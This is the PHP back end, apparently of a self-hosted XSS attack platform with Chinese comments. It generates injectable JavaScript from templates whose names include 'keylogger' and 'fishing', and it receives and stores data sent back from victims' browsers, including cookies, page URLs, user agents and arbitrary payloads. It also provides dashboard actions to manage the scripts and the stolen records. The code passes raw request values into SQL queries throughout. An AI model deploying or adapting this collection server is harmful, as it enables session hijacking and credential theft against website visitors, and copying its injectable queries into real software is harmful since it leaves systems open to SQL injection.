<?php

include('utils.php');

// 数据库配置
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'root');
define('DB_HOST', 'localhost');
define('DB_NAME', 'well');
define('XSS_TEMPLATE', listdir(__DIR__.DS.'template'));


// 创建数据库、数据表、执行安装操作
function install(){
    $conn = mysqli_connect(DB_HOST, DB_USERNAME, DB_PASSWORD);
    mysqli_query($conn,"SET NAMES utf8, character_set_client=binary, sql_mode='', interactive_timeout=3600;");

    $dbname = DB_NAME;
    mysqli_query($conn, "CREATE DATABASE `$dbname`");
    mysqli_select_db($conn, DB_NAME);

    foreach (explode(";", file_get_contents(__DIR__.DS.'install.sql')) as $s) {
        mysqli_query($conn, $s.';');
        //echo $conn->error.'<br>';
    }
    //echo $conn->error;
    echo 'install success';
    exit(0);
}

function connect_db(){
    if(!($db = mysqli_connect(DB_HOST, DB_USERNAME, DB_PASSWORD, DB_NAME))){
        exit("connect db error");
    }
    $db->query('set names utf8');
    return $db;
}

function execSql($sql) {
    $db = connect_db();
    $db->query($sql);
    $db->close();
}


class Script {
    const scriptDir = __DIR__.DS.'s';
    const types = XSS_TEMPLATE;//array('normal', 'empty', 'screenshot', 'keylogger', 'fishing');
    private $index = 0;

    function __construct($index) {
        if (!is_dir(Script::scriptDir)) {
            mkdir(Script::scriptDir);
        }
        $this->index = $index;
        $this->script = Script::scriptDir.DS."$index.js";
    }

    function delete() {
        if (is_file($this->script)) {
            unlink($this->script);
            $index = intval($this->index);
            execSql("DELETE FROM `script` WHERE `index` = $index");
            return true;
        }
        //echo $this->script;
        return false;
    }

    function create() {
        $desc = $_POST['desc'];
        $code = $_POST['code'];
        $type = $_POST['type'];

        for ($i=0; true; $i++) {
            $script = Script::scriptDir.DS."$i.js";
            if (is_file($script)) {
                continue;
            }
            if (!in_array($type, Script::types)) {
                return 'script type not exists';
            }
            $tplScript = __DIR__.DS.'template'.DS.$type;

            $content = file_get_contents($tplScript);
            $content = str_replace('&&__host__&&', $_SERVER['SERVER_NAME'], $content);
            file_put_contents($script, $content);
            // copy($tplScript, $script);
            break;
        }

        $url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $url = substr($url, 0, strrpos($url, '/') + 1) . "s/$i.js";;
        execSql("INSERT INTO script (`url`, `type`, `code`, `desc`, `index`) VALUES ('$url', '$type', '$code', '$desc', $i)");
        return $i;
    }

    function read() {
        return file_get_contents($this->script);
    }

    function write($code) {
        return file_put_contents($this->script, $code);
    }
}


function clearScript() {
    execSql('DELETE FROM `script`');
    rm(Script::scriptDir);
    mkdir(Script::scriptDir);
}

if (isset($_GET['install'])) {
    clearScript();
    install();
}

function xss_getScript(){
    $db = connect_db();
    $sql = "SELECT* FROM script";
    $ret = array();
    if ($result = $db->query($sql)) {
        while ($r = $result->fetch_assoc()) {
            array_push($ret, [
                'id' => $r['id'],
                'url' => $r['url'], 
                'desc' =>  $r['desc'],
                'type' => $r['type'],
                'code' => $r['code'],
                'index' => $r['index'],
            ]);
        }
        echo json_encode(["code"=> 0, "msg"=> "", "count"=> $result->num_rows, "data"=>$ret]);
        exit(0);
    }
}


function channel() {
    $data = $_POST['d'];
    if(get_magic_quotes_gpc()) {
        $data = stripslashes($data);
    }
    return json_decode($data, true); 
}


function delData() {
    $id = $_GET['id'];
    execSql("DELETE FROM data WHERE id=$id");
}

function getAllData() {
    $db = connect_db();
    $sql = "SELECT* FROM data";
    $ret = array();
    if ($result = $db->query($sql)) {
        while ($r = $result->fetch_assoc()) {
             array_push($ret,[
                'id' => $r['id'],
                'dateTime' => $r['dateTime'],
                'url' => $r['url'], 
                'type' =>  $r['type'],
                'referrer' => $r['referrer'],
                'userAgent' => $r['userAgent'],
                'platform' => $r['platform'],
                'title' => $r['title'],
                'language' => $r['language'],
                'screen' => $r['screen'],
                'cookie' => $r['cookie'],
                'payload' => $r['payload']
            ]);
        }
        echo json_encode(["code"=> 0, "msg"=> "", "count"=> $result->num_rows, "data"=> $ret]);
        exit(0);
    }
}


// 脚本推送数据
if (isset($_POST['d'])) {
    $data = channel();
    // if (!in_array($data['type'], Script::types)) {
    //     exit(0);
    // }
    $type = $data['type'];
    $url = $data['url'];
    $referrer = $data['referrer'];
    $userAgent = $data['userAgent'];
    $platform = $data['platform'];
    $title = $data['title'];
    $language = $data['language'];
    $screen = $data['screen'];
    $cookie = $data['cookie'];
    $payload = $data['payload'];

    if (is_array($payload)) {
        $payload = json_encode($payload);
    }
    execSql("INSERT INTO data (`type`, `url`, `referrer`, `userAgent`, `platform`, `title`, `language`, `screen`, `cookie`, `payload`) VALUES ('$type', '$url', '$referrer', '$userAgent', '$platform', '$title', '$language', '$screen', '$cookie', '$payload')");
    exit(0);
}


$action = isset($_POST['action']) ? $_POST['action'] : $_GET['action'];
$id = isset($_POST['id']) ? $_POST['id'] : (isset($_GET['id']) ? $_GET['id'] : 0);

$script = new Script($id);

switch ($action) {
    // 新建xss脚本
    case 'addScript':$script->create();break;
    case 'getScript':xss_getScript();break;
    case 'delScript':$script->delete();break;
    case 'readScript':echo $script->read();break;
    case 'writeScript':$script->write($_POST['code']);break;
    case 'help':echo file_get_contents(__DIR__.DS.'README.md');break;
    case 'clearScript':clearScript();break;
    case 'database':getAllData();break;
    case 'delData':delData();break;

    default:
        # code...
        break;
}







